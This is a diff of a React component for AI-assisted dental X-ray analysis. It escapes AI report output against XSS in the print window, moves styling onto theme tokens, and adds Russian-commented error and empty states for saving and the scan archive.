+     * плашка «заключение не сохранено» висела бы над чужим снимком из архива.
+     */
+    setIsHistoryView(true);
+    setAppliedToothCodes([]);
+    setApplyNotice(null);
+    setSaveFailure(null);
+    setFormulaFailure(null);
     // Fetch full scan with image
     try {
-      const res = await fetch(`/api/xray/scans/${scan.id}`);
+      const res = await fetch(`/api/xray/scans/${scan.id}`, { headers: denteClinicalReadHeaders() });
       if (res.ok) {
         const full: XrayScan = await res.json();
         setCurrentScan(full);
@@ -369,6 +817,9 @@ export function VisiographAnalyzer() {
     if (!currentScan?.aiReport) return;
     const win = window.open('', '_blank');
     if (!win) return;
+    // Отчёт модели экранируется: `<pre>` НЕ нейтрализует теги, и до этого
+    // исправления содержимое aiReport исполнялось как HTML в том же origin,
+    // что и приложение (XSS через окно печати).
     win.document.write(`
       <html><head><title>AI Отчёт · ShadowAnalyst</title>
       <style>body{font-family:Arial,sans-serif;padding:24px;max-width:700px;margin:0 auto}
@@ -376,8 +827,8 @@ export function VisiographAnalyzer() {
       pre{white-space:pre-wrap;font-family:inherit;font-size:14px;line-height:1.6}</style>
       </head><body>
       <h1>ИИ-Анализ 2D-снимка · ShadowAnalyst</h1>
-      <p style="color:#666;font-size:12px">Дата: ${new Date(currentScan.capturedAt).toLocaleDateString('ru-RU')}</p>
-      <pre>${currentScan.aiReport}</pre>
+      <p style="color:#666;font-size:12px">Дата: ${escapeHtml(new Date(currentScan.capturedAt).toLocaleDateString('ru-RU'))}</p>
+      <pre>${escapeHtml(currentScan.aiReport)}</pre>
       </body></html>
     `);
     win.document.close();
@@ -400,11 +851,45 @@ export function VisiographAnalyzer() {
     : [];
   const criticalCount = toothStatesArray.filter(t => t.state === 'treatment' || t.state === 'watch').length;
 
+  // Какое из трёх состояний архива показывать. Решение вынесено в общий
+  // resolvePanelPhase, потому что ошибались именно в порядке: отказ важнее
+  // пустоты, загрузка важнее пустоты. Прежнее условие было одно —
+  // `scanHistory.length > 0` — и молча накрывало оба случая.
+  const historyPhase = resolvePanelPhase({
+    isLoading: isLoadingHistory,
+    hasFailure: historyFailure !== null,
+    isEmpty: scanHistory.length === 0,
+  });
+
+  // ── Цвета: только имена, объявленные в темах ─────────────────────────────
+  // БЫЛО: по всей разметке ниже стояли var(--border), var(--surface),
+  // var(--bg-inset), var(--text), var(--text-muted) — ни одно из этих имён не
+  // объявлено ни в styles/main.css, ни в styles/dente-redesign.css, ни в
+  // styles/token-aliases.css (проверено поиском объявлений по всем .css в
+  // apps/: ноль совпадений). Объявление с неизвестной переменной браузер молча
+  // отбрасывает, и свойство берёт наследуемое либо начальное значение:
+  // border-шорткат откатывался к border-style: none, поэтому рамка карточки,
+  // разделитель шапки, рамки кнопок, пунктир зоны загрузки, обводка чипов,
+  // линии между разделами отчёта и рамки строк истории НЕ рисовались вообще;
+  // background откатывался к transparent, поэтому подложки шапки, зоны
+  // загрузки и нейтральных чипов исчезали; а color НАСЛЕДУЕТСЯ, поэтому
+  // «приглушённый» текст рисовался полным цветом --ink — приглушение как
+  // способ отделить второстепенное от главного не работало, и на чипе
+  // состояния 'план' пропадали сразу фон, рамка и приглушение.
+  // Заменено на токены темы, объявленные для светлой, тёмной и ночной тем:
+  //   --border → --line (сплошные рамки и разделители),
+  //              --line-strong для пунктира зоны загрузки — так пунктир задан
+  //              во всех остальных css проекта;
+  //   --surface → --paper; --bg-inset → --paper-soft;
+  //   --text → --ink; --text-muted → --muted.
+  // Псевдонимы в token-aliases.css намеренно НЕ добавлены: --text-muted стоит в
+  // чужих файлах в форме var(--text-muted, #718096) — объявив это имя, я молча
+  // сменил бы цвет в правилах, где сейчас работает запас.
   return (
     <details className="visiograph-analyzer-details" style={{ marginBottom: '12px' }}>
       <summary style={{
         display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer',
-        padding: '8px 0', userSelect: 'none', listStyle: 'none', color: 'var(--text-muted)',
+        padding: '8px 0', userSelect: 'none', listStyle: 'none', color: 'var(--muted)',
         width: 'fit-content'
       }}>
         <ScanLine size={18} style={{ color: 'var(--teal)' }} />
@@ -413,18 +898,34 @@ export function VisiographAnalyzer() {
         </span>
         {(scanHistory.length > 0 || isLoadingHistory) && (
           <span style={{
-            fontSize: '0.78rem', background: 'var(--teal)', color: 'white',
+            // БЫЛО: жёсткий 'white'. В тёмной теме --teal это #2dd4bf, и
+            // белая цифра на нём давала контраст 1.86 — счётчик снимков
+            // читался с трудом. --on-teal задуман ровно для этого: белый в
+            // светлой теме, почти чёрный в тёмной и ночной.
+            fontSize: '0.78rem', background: 'var(--teal)', color: 'var(--on-teal)',
             borderRadius: '999px', padding: '1px 7px', fontWeight: 600
           }}>
             {isLoadingHistory ? '…' : scanHistory.length}
           </span>
         )}
+        {/* Панель свёрнута по умолчанию (<details> без open), поэтому отказ
+            чтения архива внутри неё врач бы не увидел вовсе — а раньше он и
+            внутри выглядел как «снимков нет». Пометка в сводке — единственное
+            место, где это видно в свёрнутом виде. */}
+        {historyFailure && (
+          <span style={{
+            display: 'inline-flex', alignItems: 'center', gap: '4px',
+            fontSize: '0.78rem', color: 'var(--warn-fg)', fontWeight: 600,
+          }}>
+            <AlertTriangle size={13} /> архив снимков не прочитан
+          </span>
+        )}
       </summary>
 
       <div style={{
-        border: '1px solid var(--border)',
+        border: '1px solid var(--line)',
         borderRadius: '14px',
-        background: 'var(--surface)',
+        background: 'var(--paper)',
         marginTop: '10px',
         overflow: 'hidden',
       }}>
@@ -432,8 +933,8 @@ export function VisiographAnalyzer() {
         <div style={{
           display: 'flex', alignItems: 'center', justifyContent: 'space-between',
           padding: '12px 16px',
-          borderBottom: '1px solid var(--border)',
-          background: 'var(--bg-inset)',
+          borderBottom: '1px solid var(--line)',
+          background: 'var(--paper-soft)',
         }}>
           <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
             <Bot size={16} style={{ color: 'var(--teal)' }} />
@@ -455,9 +956,13 @@ export function VisiographAnalyzer() {
                   disabled={!voicesReady && !isSpeaking}
                   title={isSpeaking ? 'Стоп' : 'Озвучить'}
                   style={{
+                    // Пока идёт озвучивание, кнопка залита --teal. Белая иконка
+                    // на нём в тёмной теме (#2dd4bf) давала контраст 1.86 —
+                    // ровно та же поломка, что уже описана выше у счётчика
+                    // снимков. --on-teal подобран под эту заливку в каждой теме.
                     background: isSpeaking ? 'var(--teal)' : 'transparent',
-                    color: isSpeaking ? 'white' : 'var(--text-muted)',
-                    border: '1px solid var(--border)', borderRadius: '8px',
+                    color: isSpeaking ? 'var(--on-teal)' : 'var(--muted)',
+                    border: '1px solid var(--line)', borderRadius: '8px',
                     padding: '5px 8px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '4px',
                     fontSize: '0.8rem', transition: 'all 0.2s',
                   }}
@@ -468,8 +973,8 @@ export function VisiographAnalyzer() {
                   onClick={handlePrint}
                   title="Печать"
                   style={{
-                    background: 'transparent', color: 'var(--text-muted)',
-                    border: '1px solid var(--border)', borderRadius: '8px',
+                    background: 'transparent', color: 'var(--muted)',
+                    border: '1px solid var(--line)', borderRadius: '8px',
                     padding: '5px 8px', cursor: 'pointer', display: 'flex', alignItems: 'center',
                     fontSize: '0.8rem', transition: 'all 0.2s',
                   }}
@@ -480,8 +985,8 @@ export function VisiographAnalyzer() {
                   onClick={handleClear}
                   title="Закрыть результат"
                   style={{
-                    background: 'transparent', color: 'var(--text-muted)',
-                    border: '1px solid var(--border)', borderRadius: '8px',
+                    background: 'transparent', color: 'var(--muted)',
+                    border: '1px solid var(--line)', borderRadius: '8px',
                     padding: '5px 8px', cursor: 'pointer', display: 'flex', alignItems: 'center',
                     fontSize: '0.8rem',
                   }}
@@ -503,12 +1008,12 @@ export function VisiographAnalyzer() {
               onDragLeave={handleDragLeave}
               onClick={() => !isAnalyzing && fileInputRef.current?.click()}
               style={{
-                border: `2px dashed ${isDragOver ? 'var(--teal)' : 'var(--border)'}`,
+                border: `2px dashed ${isDragOver ? 'var(--teal)' : 'var(--line-strong)'}`,
                 borderRadius: '12px',
                 padding: '28px 20px',
                 textAlign: 'center',
                 cursor: isAnalyzing ? 'not-allowed' : 'pointer',
-                background: isDragOver ? 'var(--teal-soft)' : 'var(--bg-inset)',
+                background: isDragOver ? 'var(--teal-soft)' : 'var(--paper-soft)',
                 transition: 'all 0.25s ease',
                 opacity: isAnalyzing ? 0.7 : 1,
               }}
@@ -524,18 +1029,18 @@ export function VisiographAnalyzer() {
               {isAnalyzing ? (
                 <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '12px' }}>
                   <Loader2 size={36} className="animate-spin" style={{ color: 'var(--teal)' }} />
-                  <p style={{ margin: 0, fontWeight: 600, color: 'var(--text)' }}>Анализируем снимок...</p>
-                  <p style={{ margin: 0, fontSize: '0.85rem', color: 'var(--text-muted)' }}>
+                  <p style={{ margin: 0, fontWeight: 600, color: 'var(--ink)' }}>Анализируем снимок...</p>
+                  <p style={{ margin: 0, fontSize: '0.85rem', color: 'var(--muted)' }}>
                     ИИ-модель обрабатывает данные. Обычно 10–25 секунд.
                   </p>
                 </div>
               ) : (
                 <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '10px' }}>
-                  <UploadCloud size={36} style={{ color: isDragOver ? 'var(--teal)' : 'var(--text-muted)' }} />
-                  <p style={{ margin: 0, fontWeight: 600, color: isDragOver ? 'var(--teal)' : 'var(--text)' }}>
+                  <UploadCloud size={36} style={{ color: isDragOver ? 'var(--teal)' : 'var(--muted)' }} />
+                  <p style={{ margin: 0, fontWeight: 600, color: isDragOver ? 'var(--teal)' : 'var(--ink)' }}>
                     {isDragOver ? 'Отпустите снимок' : 'Перетащите снимок или нажмите'}
                   </p>
-                  <p style={{ margin: 0, fontSize: '0.82rem', color: 'var(--text-muted)' }}>
+                  <p style={{ margin: 0, fontSize: '0.82rem', color: 'var(--muted)' }}>
                     Прицельный снимок (JPG, PNG, BMP). ИИ найдёт кариес, периодонтит, обновит формулу зубов.
                   </p>
                   <button
@@ -553,8 +1058,13 @@ export function VisiographAnalyzer() {
           {/* Error state */}
           {error && (
             <div style={{
-              padding: '12px 16px', background: 'var(--error-surface, #fff0f0)',
-              color: 'var(--error, #c62828)', borderRadius: '10px',
+              // БЫЛО: var(--error-surface, #fff0f0) и var(--error, #c62828).
+              // Оба имени не объявлены ни в одной теме, поэтому всегда работал
+              // запас — светло-розовая плашка со светлой темы держалась и в
+              // тёмной, и в ночной. --bad-bg/--bad-fg объявлены во всех трёх
+              // темах; в светлой они дают тот же смысл, что прежние литералы.
+              padding: '12px 16px', background: 'var(--bad-bg)',
+              color: 'var(--bad-fg)', borderRadius: '10px',
               display: 'flex', alignItems: 'flex-start', gap: '10px',
               fontSize: '0.88rem', marginTop: currentScan ? '0' : '12px',
             }}>
@@ -575,23 +1085,100 @@ export function VisiographAnalyzer() {
 
               {/* Image viewer */}
               {currentImageUrl && (
-                <div style={{ borderRadius: '10px', overflow: 'hidden', border: '1px solid var(--border)' }}>
+                <div style={{ borderRadius: '10px', overflow: 'hidden', border: '1px solid var(--line)' }}>
                   <ShadowAnalystImageSlider imageUrl={currentImageUrl} enhanced={true} />
                 </div>
               )}
 
               {/* Saving indicator */}
               {isSaving && (
-                <div style={{ fontSize: '0.8rem', color: 'var(--text-muted)', display: 'flex', alignItems: 'center', gap: '6px' }}>
+                <div style={{ fontSize: '0.8rem', color: 'var(--muted)', display: 'flex', alignItems: 'center', gap: '6px' }}>
                   <Loader2 size={12} className="animate-spin" /> Сохранение в карту пациента...
+                </div>
+              )}
+
+              {/*
+                * Отказ записи в карту. Стоит РЯДОМ с заключением, а не наверху
+                * панели: врач читает текст разбора и должен здесь же увидеть, что
+                * в карту он не попал. Цвет — предупреждение (--warn-bg/--warn-fg
+                * объявлены во всех трёх темах), потому что разбор не потерян,
+                * он на экране; потеряна только запись.
+                */}
+              {!isSaving && saveFailure && (
+                <div
+                  role="alert"
+                  style={{
+                    padding: '10px 14px', background: 'var(--warn-bg)', color: 'var(--warn-fg)',
+                    borderRadius: '10px', display: 'flex', alignItems: 'flex-start', gap: '10px',
+                    fontSize: '0.85rem',
+                  }}
+                >
+                  <AlertTriangle size={16} style={{ flexShrink: 0, marginTop: '2px' }} aria-hidden="true" />
+                  <div>
+                    <strong>Заключение не сохранено в карту</strong>
+                    <div style={{ marginTop: '4px' }}>{saveFailure}</div>
+                  </div>
+                </div>
+              )}
+
+              {/*
+                * Отказ записи В ЗУБНУЮ ФОРМУЛУ — своя плашка, а не общая с
+                * отказом записи снимка: это две разные записи в карте пациента,
+                * и врач должен видеть, какая именно не сохранилась. Стоит выше
+                * счётчика «Внесено в зубную формулу», чтобы отказ читался раньше
+                * числа.
+                */}
+              {formulaFailure && (
+                <div
+                  role="alert"
+                  style={{
+                    padding: '10px 14px', background: 'var(--warn-bg)', color: 'var(--warn-fg)',
+                    borderRadius: '10px', display: 'flex', alignItems: 'flex-start', gap: '10px',
+                    fontSize: '0.85rem',
+                  }}
+                >
+                  <AlertTriangle size={16} style={{ flexShrink: 0, marginTop: '2px' }} aria-hidden="true" />
+                  <div>
+                    <strong>Находки не внесены в зубную формулу</strong>
+                    <div style={{ marginTop: '4px' }}>{formulaFailure}</div>
+                  </div>
+                </div>
+              )}
+
+              {/*
+                * Непонятые находки. Отдельной строкой и до плашек: врач должен
+                * узнать, что часть зубов помощник описал так, что в формулу их не
+                * внесли, — иначе он решит, что снимок разобран целиком.
+                */}
+              {applyNotice && (
+                <div
+                  role="status"
+                  style={{
+                    padding: '10px 14px', background: 'var(--warn-bg)', color: 'var(--warn-fg)',
+                    borderRadius: '10px', display: 'flex', alignItems: 'flex-start', gap: '10px',
+                    fontSize: '0.85rem',
+                  }}
+                >
+                  <AlertTriangle size={16} style={{ flexShrink: 0, marginTop: '2px' }} aria-hidden="true" />
+                  <div>{applyNotice}</div>
                 </div>
               )}
 
               {/* Tooth states badges */}
               {toothStatesArray.length > 0 && (
                 <div>
-                  <div style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginBottom: '8px', fontWeight: 600 }}>
-                    Зубы из анализа ({toothStatesArray.length} поз.) · обновлено в формуле
+                  {/*
+                    * Считаем ТОЛЬКО применённые. Раньше здесь стояло
+                    * `toothStatesArray.length` с подписью «обновлено в формуле»,
+                    * и непонятая находка или зуб с мусорным номером считались
+                    * внесёнными, хотя формулу никто не менял.
+                    */}
+                  <div style={{ fontSize: '0.8rem', color: 'var(--muted)', marginBottom: '8px', fontWeight: 600 }}>
+                    {isHistoryView
+                      ? `Зубы из этого разбора: ${toothStatesArray.length} поз.`
+                      : appliedToothCodes.length > 0
+                        ? `Внесено в зубную формулу: ${countLabel(appliedToothCodes.length, 'зуб', 'зуба', 'зубов')} из ${toothStatesArray.length}`
+                        : `Зубы из анализа (${toothStatesArray.length} поз.) · в формулу не внесены`}
                   </div>
                   <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px' }}>
                     {toothStatesArray.map(({ code, state }) => {
@@ -601,9 +1188,9 @@ export function VisiographAnalyzer() {
                         <span key={code} style={{
                           display: 'inline-flex', alignItems: 'center', gap: '4px',
                           padding: '3px 10px', borderRadius: '999px', fontSize: '0.8rem', fontWeight: 600,
-                          background: isCritical ? 'var(--rust, #c62828)' : isDone ? 'var(--teal-soft)' : 'var(--bg-inset)',
-                          color: isCritical ? 'white' : isDone ? 'var(--teal)' : 'var(--text-muted)',
-                          border: `1px solid ${isCritical ? 'transparent' : isDone ? 'var(--teal)' : 'var(--border)'}`,
+                          background: isCritical ? 'var(--rust, #c62828)' : isDone ? 'var(--teal-soft)' : 'var(--paper-soft)',
+                          color: isCritical ? 'white' : isDone ? 'var(--teal)' : 'var(--muted)',
+                          border: `1px solid ${isCritical ? 'transparent' : isDone ? 'var(--teal)' : 'var(--line)'}`,
                         }}>
                           {isCritical ? <AlertTriangle size={10} /> : <CheckCircle2 size={10} />}
                           {code}
@@ -617,25 +1204,25 @@ export function VisiographAnalyzer() {
 
               {/* AI Report sections */}
               {reportSections.length > 0 && (
-                <div style={{ border: '1px solid var(--border)', borderRadius: '10px', overflow: 'hidden' }}>
+                <div style={{ border: '1px solid var(--line)', borderRadius: '10px', overflow: 'hidden' }}>
                   <div style={{
-                    padding: '10px 14px', background: 'var(--bg-inset)',
+                    padding: '10px 14px', background: 'var(--paper-soft)',
                     display: 'flex', alignItems: 'center', gap: '8px',
-                    borderBottom: '1px solid var(--border)',
+                    borderBottom: '1px solid var(--line)',
                   }}>
                     <Sparkles size={14} style={{ color: 'var(--teal)' }} />
                     <span style={{ fontWeight: 600, fontSize: '0.88rem' }}>Полный отчёт ShadowAnalyst</span>
-                    <span style={{ fontSize: '0.78rem', color: 'var(--text-muted)', marginLeft: 'auto' }}>
+                    <span style={{ fontSize: '0.78rem', color: 'var(--muted)', marginLeft: 'auto' }}>
                       {new Date(currentScan.capturedAt).toLocaleDateString('ru-RU')}
                     </span>
                   </div>
                   {reportSections.map((section, idx) => (
-                    <div key={idx} style={{ borderBottom: idx < reportSections.length - 1 ? '1px solid var(--border)' : 'none' }}>
+                    <div key={idx} style={{ borderBottom: idx < reportSections.length - 1 ? '1px solid var(--line)' : 'none' }}>
                       <button
                         onClick={() => setActiveSection(activeSection === idx ? null : idx)}
                         style={{
                           width: '100%', textAlign: 'left', padding: '10px 14px',
-                          background: activeSection === idx ? 'var(--bg-inset)' : 'transparent',
+                          background: activeSection === idx ? 'var(--paper-soft)' : 'transparent',
                           border: 'none', cursor: 'pointer',
                           display: 'flex', alignItems: 'center', gap: '8px',
                           transition: 'background 0.15s',
@@ -648,7 +1235,7 @@ export function VisiographAnalyzer() {
                           style={{
                             transform: activeSection === idx ? 'rotate(180deg)' : 'none',
                             transition: 'transform 0.2s',
-                            color: 'var(--text-muted)',
+                            color: 'var(--muted)',
                           }}
                         />
                       </button>
@@ -658,7 +1245,7 @@ export function VisiographAnalyzer() {
                             padding: '8px 14px 14px 34px',
                             fontSize: '0.87rem',
                             lineHeight: 1.65,
-                            color: 'var(--text)',
+                            color: 'var(--ink)',
                           }}
                           dangerouslySetInnerHTML={{ __html: renderMarkdown(section.content) }}
                         />
@@ -674,7 +1261,7 @@ export function VisiographAnalyzer() {
                 style={{
                   display: 'flex', alignItems: 'center', gap: '8px', justifyContent: 'center',
                   padding: '9px 20px', borderRadius: '8px', cursor: 'pointer', fontSize: '0.88rem',
-                  background: 'transparent', border: '1px solid var(--border)', color: 'var(--text-muted)',
+                  background: 'transparent', border: '1px solid var(--line)', color: 'var(--muted)',
                   transition: 'all 0.2s',
                 }}
               >
@@ -684,15 +1271,46 @@ export function VisiographAnalyzer() {
             </div>
           )}
 
-          {/* Scan history */}
-          {!currentScan && scanHistory.length > 0 && (
+          {/* Архив снимков: загрузка / отказ / пусто / список — четыре разных
+              вида вместо прежних двух («список» и «ничего», куда попадал и
+              отказ сервера). */}
+          {!currentScan && selectedPatientId && historyPhase === 'loading' && (
+            <div style={{
+              marginTop: '16px', fontSize: '0.85rem', color: 'var(--muted)',
+              display: 'flex', alignItems: 'center', gap: '6px',
+            }}>
+              <Loader2 size={13} className="animate-spin" />
+              {panelStateText(SCAN_ARCHIVE_SUBJECT, { phase: 'loading' }).title}
+            </div>
+          )}
+
+          {!currentScan && selectedPatientId && historyPhase === 'failed' && historyFailure && (
+            <div style={{ marginTop: '16px' }}>
+              <PanelLoadFailure
+                subject={SCAN_ARCHIVE_SUBJECT}
+                status={historyFailure.status}
+                onRetry={() => loadHistory(selectedPatientId)}
+              />
+            </div>
+          )}
+
+          {/* Честная пустота. Что делать дальше, уже написано в зоне загрузки
+              выше, поэтому подсказка здесь не повторяется — иначе на одном
+              экране два раза сказано одно и то же. */}
+          {!currentScan && selectedPatientId && historyPhase === 'empty' && (
+            <div style={{ marginTop: '16px', fontSize: '0.82rem', color: 'var(--muted)' }}>
+              {panelStateText(SCAN_ARCHIVE_SUBJECT, { phase: 'empty' }).title}
+            </div>
+          )}
+
+          {!currentScan && historyPhase === 'ready' && (
             <div style={{ marginTop: '16px' }}>
               <button
                 onClick={() => setHistoryExpanded(!historyExpanded)}
                 style={{
                   display: 'flex', alignItems: 'center', gap: '6px',
                   background: 'none', border: 'none', cursor: 'pointer',
-                  fontSize: '0.85rem', color: 'var(--text-muted)', padding: '4px 0',
+                  fontSize: '0.85rem', color: 'var(--muted)', padding: '4px 0',
                   fontWeight: 500,
                 }}
               >
@@ -712,22 +1330,22 @@ export function VisiographAnalyzer() {
                       style={{
                         display: 'flex', alignItems: 'center', gap: '10px',
                         padding: '10px 12px', borderRadius: '8px',
-                        border: '1px solid var(--border)', background: 'var(--bg-inset)',
+                        border: '1px solid var(--line)', background: 'var(--paper-soft)',
                         cursor: 'pointer', textAlign: 'left', transition: 'all 0.15s',
                       }}
                     >
                       <div style={{
                         width: '36px', height: '36px', borderRadius: '6px',
-                        background: 'var(--surface)', display: 'flex', alignItems: 'center', justifyContent: 'center',
-                        border: '1px solid var(--border)', flexShrink: 0,
+                        background: 'var(--paper)', display: 'flex', alignItems: 'center', justifyContent: 'center',
+                        border: '1px solid var(--line)', flexShrink: 0,
                       }}>
                         <ScanLine size={16} style={{ color: 'var(--teal)' }} />
                       </div>
                       <div style={{ flex: 1, minWidth: 0 }}>
-                        <div style={{ fontWeight: 600, fontSize: '0.85rem', color: 'var(--text)' }}>
+                        <div style={{ fontWeight: 600, fontSize: '0.85rem', color: 'var(--ink)' }}>
                           {scan.originalFilename ?? 'Снимок'}
                         </div>
-                        <div style={{ fontSize: '0.78rem', color: 'var(--text-muted)', marginTop: '2px' }}>
+                        <div style={{ fontSize: '0.78rem', color: 'var(--muted)', marginTop: '2px' }}>
                           {new Date(scan.capturedAt).toLocaleDateString('ru-RU')} ·{' '}
                           {scan.aiToothStates ? Object.keys(scan.aiToothStates).length : 0} зубов
                           {scan.aiSummary && (
@@ -735,7 +1353,7 @@ export function VisiographAnalyzer() {
                           )}
                         </div>
                       </div>
-                      <ZoomIn size={14} style={{ color: 'var(--text-muted)', flexShrink: 0 }} />
+                      <ZoomIn size={14} style={{ color: 'var(--muted)', flexShrink: 0 }} />
                     </button>
                   ))}
                 </div>
